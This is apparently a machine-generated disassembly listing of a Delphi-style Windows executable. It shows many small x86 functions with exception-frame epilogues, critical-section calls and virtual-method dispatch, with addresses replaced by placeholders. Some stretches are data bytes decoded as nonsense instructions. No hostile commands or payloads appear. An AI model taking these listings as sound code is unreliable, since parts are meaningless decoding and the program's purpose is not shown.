pop ebp
retn
sub_42105e
jmp sub_405fd0
sub_421065
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4210d6
jmp sub_405fd0
sub_4210dd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421494
push eax
call sub_41c288
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_4214a8
push eax
call sub_41c288
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_421667
jmp sub_405fd0
sub_421693
jmp sub_405fd0
sub_42169a
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421917
jmp sub_405fd0
sub_42191e
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_421be0
jmp sub_405fd0
sub_421c6f
jmp sub_405fd0
sub_421d60
jmp sub_405fd0
sub_421e03
jmp sub_405fd0
sub_421eba
jmp sub_405fd0
sub_421f60
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_41c5f0
add esp 0x10
sub_4222ef
jmp sub_405fd0
sub_4222f6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42248c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_41c288
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_4224a4
mov edx 0x80020004
call sub_42248c
retn
sub_4224f4
mov dl 0x1
call sub_4224fc
retn
sub_4225ad
jmp sub_405fd0
sub_4225b4
pop esi
pop ebx
pop ebp
retn
sub_4225b8
push ebp
mov ebp esp
call sub_422a38
pop ebp
retn 0x4
sub_422644
push ebp
mov ebp esp
call sub_422a38
pop ebp
retn 0x4
sub_422929
jmp sub_405fd0
sub_422958
jmp sub_405fd0
sub_4229e7
jmp sub_405fd0
sub_4229ee
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4055e0
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_405b5c
sub_422a10
xor eax eax
retn
sub_422a14
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
movzx eax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_422a28
mov [ ecx ] 0x8
mov al 0x1
retn
sub_422a30
call sub_41b9e4
retn
sub_422a38
call sub_41bad4
retn
sub_422a40
call sub_41bf84
retn
sub_422a48
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
movzx eax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_422a5c
call sub_422a38
retn
sub_422a64
push ebp
mov ebp esp
call sub_422a40
pop ebp
retn 0x8
sub_422a7c
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_422b58
jmp sub_405fd0
sub_422c11
jmp sub_405fd0
sub_422c18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422c35
lea eax [ ebp - 0x10 ]
call j_sub_4068a0
retn
sub_422c2e
jmp sub_405fd0
sub_422c35
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_422c40
call sub_41bfd8
retn
sub_422c48
mov ecx 0xe
call sub_421ef8
cmp al 0x1
retn
sub_422cc7
jmp sub_405fd0
sub_422cce
pop ebp
retn
sub_422f8c
jmp sub_405fd0
sub_422f93
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423078
jmp sub_405fd0
sub_42307f
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423220
jmp sub_405fd0
sub_423227
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423329
jmp sub_405fd0
sub_423330
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423500
jmp sub_405fd0
sub_423507
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4235e2
jmp sub_405fd0
sub_4235e9
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4236f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
mov ecx 0x0
call sub_4072d4
pop esi
pop ebx
retn
sub_4237d5
jmp sub_405fd0
sub_4237dc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42382c
jmp sub_405fd0
sub_423833
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423889
jmp sub_405fd0
sub_423890
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4238e0
jmp sub_405fd0
sub_4238e7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423a7e
jmp sub_405fd0
sub_423a85
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423b7a
jmp sub_405fd0
sub_423b81
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423c90
jmp sub_405fd0
sub_423c97
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423de6
jmp sub_405fd0
sub_423ded
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423f07
jmp sub_405fd0
sub_423f0e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424228
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_41c5f0
pop esi
pop ebx
retn
sub_4244d2
jmp sub_405fd0
sub_4244d9
pop ebp
retn
sub_425517
push ebp
push ebp
inc edx
add [ edx ] al
hlt
sub_425521
push esi
inc edx
add [ edx ] cl
add al [ eax ]
dec ebx
push esi
inc edx
add [ edx ] al
hlt
sub_425577
push [ esi + 0x58 ]
inc edx
add [ edx ] al
hlt
sub_425597
push [ ecx + 0x59 ]
inc edx
add [ edx ] al
hlt
sub_425c2d
fistp [ edx + eax * 2 ]
inc edx
add ah dh
inc [ ebx * 2 + r-xdata ]
hlt
sub_425ebd
push ebx
pop esi
inc edx
add [ edx ] al
hlt
sub_42659e
inc edx
add [ eax + eax - 0xc ] al
inc [ esi ]
inc dx
add [ edx ] al
hlt
sub_4265ac
push [ eax ]
inc dx
add [ edx ] al
hlt
sub_4267cf
add ah dh
dec ebp
push r-xdata
hlt
sub_426c9e
stc
insb
inc edx
add [ edx ] al
hlt
sub_42897b
fimul [ ecx + r-xdata ]
hlt
sub_4291bf
add [ esp + 0x4 ] 0xffffffec
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_429381
cmp [ edx + eax * 2 - 0xffb300 ] edx
jmp [ eax - 0x6c ]
sub_42b6df
[ 0x420042b9 ]
add ah dh
[ eax - 0x47 ]
inc edx
add [ edx ] al
hlt
sub_42b738
mov esp 0x420042bb
add ah dh
push ebp
mov ebx r-xdata
hlt
sub_42b747
push [ eax ]
mov esp r-xdata
hlt
sub_42c17c
add [ eax ] al
add [ eax ] al
xchg esi eax
retn
sub_42c30d
inc [ esp + eax * 8 ]
inc edx
add [ edx ] cl
stc
push [ 0x420042c4 ]
add ah dh
[ ebx - 0x3c ]
inc edx
add [ edx ] al
hlt
sub_42c36d
push [ esi - 0x3a ]
inc edx
add [ ecx ] al
hlt
sub_42c95c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
0x42
sub_42c9e8
inc esp
add ah dh
dec [ ebx - 0x36 ]
inc edx
add [ edx ] al
hlt
sub_42c9f3
push [ ebp - 0x36 ]
inc edx
add [ edx ] al
hlt
sub_42cdb6
inc edx
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 8 ] bh
inc edx
add [ edx * 8 - 0x31b1ffbe ] bl
inc edx
add [ edi + ecx * 8 ] bh
inc edx
add al ch
iretd
sub_42cdce
inc edx
add [ eax + edx * 8 + 0x42 ] al
add [ eax ] bh
add [ eax ] al
add [ eax + 0x5f ] ch
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0xfffbfa8 ] bh
int3
sub_42d005
push ecx
[ eax ]
sub_42eb50
mov eax [ eax + 0xc ]
call sub_4303e0
retn
sub_42edc7
jmp sub_405fd0
sub_42edce
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42eebd
jmp sub_405fd0
sub_42eec4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ef04
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42ed60
test eax eax
setge al
pop esi
pop ebx
retn
sub_42f31a
jmp sub_405fd0
sub_42f321
mov esp ebp
pop ebp
retn
sub_42f3fc
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42f408
push ebx
mov ebx edx
mov edx ebx
call sub_42f1fc
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_42ee1c
sub_42f4d4
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42f673
jmp sub_405fd0
sub_42f75b
jmp sub_405fd0
sub_42f7e2
jmp sub_405fd0
sub_42f7e9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_42f7f4
mov eax [ eax - 0x44 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_42f860
jmp sub_405fd0
sub_42f867
pop ebx
mov esp ebp
pop ebp
retn
sub_42f8c8
jmp sub_405fd0
sub_42f8cf
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_42f974
jmp sub_405fd0
sub_42f97b
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42f9d9
jmp sub_405fd0
sub_42f9e0
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42fa41
jmp sub_405fd0
sub_42fa48
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42faae
jmp sub_405fd0
sub_42fab5
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42fb20
jmp sub_405fd0
sub_42fb27
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_42fd46
jmp sub_405fd0
sub_42fdc2
jmp sub_405fd0
sub_42fe9c
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_4307a8
sub_42ff8c
jmp sub_405fd0
sub_4300fc
jmp sub_405fd0
sub_430103
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43019a
jmp sub_405fd0
sub_4301a1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4301c0
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4301b9
jmp sub_405fd0
sub_4301c0
movzx eax [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_43022d
jmp sub_405fd0
sub_430234
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_430324
jmp sub_405fd0
sub_43032b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4055f0
retn
sub_430341
jmp sub_405fd0
sub_43039c
mov edx [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4305a0
retn
sub_4303a8
mov edx [ eax + 0x8 ]
mov edx [ edx + 0x8 ]
dec edx
cmp edx [ eax + 0x4 ]
setg dl
test dl dl
je r-xdata
mov eax edx
retn
inc [ eax + 0x4 ]
sub_430420
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_430880
xor edx edx
mov eax ebx
call sub_430844
pop ebx
retn
sub_4304a0
mov eax [ ebp + 0x4 ]
retn
sub_4304d6
pop ecx
pop edx
pop esi
pop ebx
retn
sub_430524
jmp sub_405fd0
sub_43052b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_430580
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_430598
xor edx edx
call sub_4305a0
retn
sub_4305c4
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_430358
retn
sub_4306d0
mov edx [ eax + 0x8 ]
test edx edx
jle r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax [ eax ]
call sub_4304dc
xor eax eax
retn
mov eax [ eax + 0x4 ]
mov eax [ eax + edx * 4 - 0x4 ]
retn
sub_4307a8
xor ecx ecx
call sub_4307b0
retn
sub_4309f1
jmp sub_405fd0
sub_4309f8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_430a05
add eax 0xfffffff0
jmp sub_430b14
sub_430a0d
add [ esp + 0x4 ] 0xfffffff0
jmp sub_409d60
sub_430a17
add [ esp + 0x4 ] 0xfffffff0
jmp sub_409d88
sub_430a21
add [ esp + 0x4 ] 0xfffffff0
jmp sub_409d9c
sub_430b14
push ebx
mov ebx eax
mov eax edx
mov edx ecx
call [ ebx + 0xc ]
pop ebx
retn
sub_430b92
jmp sub_405fd0
sub_430b99
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_430bc0
xor ecx ecx
call sub_430bc8
retn
sub_430c18
retn
sub_430e15
jmp sub_405fd0
sub_430ed5
jmp sub_405fd0
sub_430f9f
jmp sub_405fd0
sub_430fa6
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_405b5c
sub_431034
jmp sub_405fd0
sub_43103b
pop ebx
pop ecx
pop ebp
retn
sub_43107e
jmp sub_405fd0
sub_431085
pop ecx
pop ebp
retn
sub_43109c
xor ecx ecx
call sub_4310a4
retn
sub_4310ec
jmp sub_405fd0
sub_4310f3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4310f8
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_431134
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
retn
sub_43114c
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_431227
retn
sub_4312cc
test edx edx
je r-xdata
xor edx edx
call sub_4312e0
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_431378
jmp sub_405fd0
sub_43137f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43139c
xchg edx eax
call sub_4312e0
retn
sub_4313a4
retn
sub_431423
jmp sub_405fd0
sub_43142a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4315f5
jmp sub_405fd0
sub_4315fc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431690
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x8 ]
xchg edx eax
call sub_430608
retn
sub_4316a8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx ]
call sub_4054c8
pop esi
pop ebx
retn
sub_43173d
jmp sub_405fd0
sub_431744
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431794
xor edx edx
call sub_43166c
retn
sub_431810
mov edx [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
call sub_431aa4
retn
sub_43181c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
call sub_431a9c
dec eax
cmp eax [ ebx + 0x4 ]
setg al
test al al
je r-xdata
pop ebx
retn
inc [ ebx + 0x4 ]
sub_43197f
jmp sub_405fd0
sub_431998
inc [ eax + 0xc ]
retn
sub_43199c
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_431a08
jmp sub_405fd0
sub_431a14
dec [ eax + 0xc ]
call sub_43199c
retn
sub_431a50
xor eax eax
retn
sub_431a54
push ebx
mov ebx ecx
mov eax ebx
xor edx edx
call sub_4070a8
pop ebx
retn
sub_431a64
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4317cc
retn
sub_431a74
mov eax [ eax + 0x8 ]
mov eax [ eax + 0xc ]
retn
sub_431a9c
mov eax [ eax + 0x8 ]
mov eax [ eax + 0x8 ]
retn
sub_431aa4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4305a0
pop esi
pop ebx
retn
sub_431b4b
jmp sub_405fd0
sub_431b52
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_431c84
jmp sub_405fd0
sub_431caf
jmp sub_405fd0
sub_431cb6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431d98
mov ecx [ eax + 0x8 ]
cmp edx [ ecx + 0xc ]
je r-xdata
retn
mov eax ecx
call sub_430844
sub_431da8
retn
sub_431dac
retn
sub_431de0
push esi
mov si 0xffff
call sub_40587c
pop esi
retn
sub_431dec
retn
sub_431df0
retn
sub_431e5c
push ebx
push esi
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_431f08
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
pop esi
retn
sub_431f9e
jmp sub_405fd0
sub_431fa5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431fc2
lea eax [ ebp - 0xc ]
call j_sub_4068a0
retn
sub_431fbb
jmp sub_405fd0
sub_431fc2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43206f
jmp sub_405fd0
sub_432088
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
inc [ ebx + 0x14 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_432150
dec [ eax + 0x14 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_4321f9
jmp sub_405fd0
sub_432200
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43220c
mov eax [ ebp + 0x4 ]
retn
sub_432242
pop ecx
pop edx
pop esi
pop ebx
retn
sub_432290
jmp sub_405fd0
sub_432297
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432356
jmp sub_405fd0
sub_43235d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432382
lea eax [ ebp - 0x10 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_43237b
jmp sub_405fd0
sub_432382
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43238c
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_43241e
jmp sub_405fd0
sub_432425
pop ebx
mov esp ebp
pop ebp
retn
sub_43264d
jmp sub_405fd0
sub_432654
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4326f5
jmp sub_405fd0
sub_4326fc
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_43288f
jmp sub_405fd0
sub_432896
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432914
jmp sub_405fd0
sub_43291b
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4329eb
jmp sub_405fd0
sub_4329f2
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432aa8
jmp sub_405fd0
sub_432aaf
pop ebx
pop ecx
pop ebp
retn
sub_432b01
jmp sub_405fd0
sub_432b08
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432b10
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x74 ]
pop ebx
retn
sub_432bd6
jmp sub_405fd0
sub_432bdd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432c08
lea eax [ ebp - 0x10 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_408928
retn
sub_432c01
jmp sub_405fd0
sub_432c08
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432c94
jmp sub_405fd0
sub_432cb1
jmp sub_405fd0
sub_432cb8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_432cf0
retn
sub_432d73
jmp sub_405fd0
sub_432d7a
mov eax [ ebp - 0x8 ]
call sub_436a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432d9f
lea eax [ ebp - 0xc ]
call j_sub_4068a0
retn
sub_432d98
jmp sub_405fd0
sub_432d9f
mov esp ebp
pop ebp
retn
sub_432da4
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x80 ]
pop ebx
retn
sub_432e07
jmp sub_405fd0
sub_432e0e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432e14
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop ebx
retn
sub_432ecd
jmp sub_405fd0
sub_432ed4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432edc
retn
sub_432f7f
jmp sub_405fd0
sub_432f86
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4330e2
jmp sub_405fd0
sub_433114
jmp sub_405fd0
sub_43311b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4331b2
jmp sub_405fd0
sub_4331b9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_433345
jmp sub_405fd0
sub_43334c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433369
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_433362
jmp sub_405fd0
sub_433369
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_433370
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x1
jne r-xdata
movzx eax [ ebx + 0x6 ]
pop ebx
retn
mov dx 0x2c
mov eax ebx
call sub_4333fc
sub_4333c8
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x2
jne r-xdata
movzx eax [ ebx + 0xc ]
pop ebx
retn
mov dx 0x22
mov eax ebx
call sub_433448
sub_4333e4
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x10
jne r-xdata
movzx eax [ ebx + 0x10 ]
pop ebx
retn
xor edx edx
mov eax ebx
call sub_433468
sub_433484
mov eax edx
mov edx ecx
call sub_411254
retn
sub_433490
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
movzx eax [ ebx + 0xe ]
pop ebx
retn
mov dx 0x3d
mov eax ebx
call sub_4334ac
sub_433550
push ebx
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop esi
pop ebx
retn
sub_4335c4
push ebx
cmp [ eax + 0x14 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x32 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_4335e0
push ebx
cmp [ eax + 0x14 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x3a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_433818
mov eax [ eax + 0x24 ]
retn
sub_43381c
mov eax [ eax + 0x20 ]
retn
sub_4338b4
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_433b60
mov edx sub_433b40
mov ecx [ eax ]
call [ ecx + 0xa4 ]
retn
sub_433ba8
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_411254
retn
mov eax edx
mov edx ecx
call sub_411188
retn
sub_433ce8
retn
sub_433dba
jmp sub_405fd0
sub_433dc1
mov esp ebp
pop ebp
retn
sub_434008
jmp sub_405fd0
sub_43400f
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_434070
jmp sub_405fd0
sub_434077
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_434080
xor ecx ecx
call sub_434088
retn
sub_4340d8
jmp sub_405fd0
sub_4340df
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4340e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43448c
mov edx esi
mov eax ebx
call sub_434020
pop esi
pop ebx
retn
sub_434100
push 0x0
call sub_434458
retn
sub_434387
jmp sub_405fd0
sub_43438e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4345b4
mov eax [ eax + 0x4 ]
call sub_411f94
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_4345c4
mov eax [ eax + 0x4 ]
call sub_411fc0
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_434600
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_4347cb
jmp sub_405fd0
sub_434828
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_43488c
push ebx
mov ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx [ eax + 0x4 ]
xchg edx ebx
mov eax ebx
call sub_433ef4
sub_4348ef
jmp sub_405fd0
sub_4348f6
pop ebx
pop ecx
pop ebp
retn
sub_434928
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4349cc
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_4349c0
jmp sub_405fd0
sub_4349c7
pop ebx
pop ecx
pop ebp
retn
sub_434c2e
jmp sub_405fd0
sub_434c35
mov esp ebp
pop ebp
retn
sub_434cd8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
retn
sub_434d60
mov [ eax + 0x18 ] edx
retn
sub_435130
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_423430
retn
sub_4351b7
jmp sub_405fd0
sub_4351be
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435291
jmp sub_405fd0
sub_435298
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435468
jmp sub_405fd0
sub_4354ba
jmp sub_405fd0
sub_4354e3
jmp sub_405fd0
sub_4354ea
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435509
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_435502
jmp sub_405fd0
sub_435509
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4355b5
jmp sub_405fd0
sub_435647
jmp sub_405fd0
sub_435658
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
pop ebx
retn
sub_435670
mov eax [ rw-data ]
call sub_435658
retn
sub_4356a8
push ebx
call sub_423520
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_435670
sub_435742
jmp sub_405d1c
sub_43588e
jmp sub_405fd0
sub_435895
mov eax [ ebp - 0x4 ]
add eax 0x80
xor edx edx
call sub_4070a8
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_4358c0
push ebx
mov ebx eax
mov eax ebx
call sub_435be8
mov eax [ ebx + 0x34 ]
call sub_4055f0
xor eax eax
mov [ ebx + 0x34 ] eax
pop ebx
retn
sub_435a3b
jmp sub_405fd0
sub_435a42
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435b61
jmp sub_405fd0
sub_435b7e
jmp sub_405fd0
sub_435b85
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435cb8
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_433c68
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_435d7c
push ebx
mov ebx eax
mov eax ebx
call sub_437b4c
cmp al 0x9
sete al
pop ebx
retn
sub_435e14
jmp sub_405fd0
sub_435e1b
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_435e76
jmp sub_405fd0
sub_435e7d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_435f24
jmp sub_405fd0
sub_435f2b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4361b6
jmp sub_405d1c
sub_4361e2
jmp sub_405d1c
sub_436284
jmp sub_405d1c
sub_436327
jmp sub_405d1c
sub_436502
jmp sub_405d1c
sub_436544
jmp sub_405fd0
sub_436577
jmp sub_405fd0
sub_43657e
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4365eb
jmp sub_405fd0
sub_4366c2
jmp sub_405fd0
sub_4366c9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436950
jmp sub_405fd0
sub_436957
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436a6c
mov dl 0x1
call sub_435764
retn
sub_436a74
xor edx edx
call sub_435764
retn
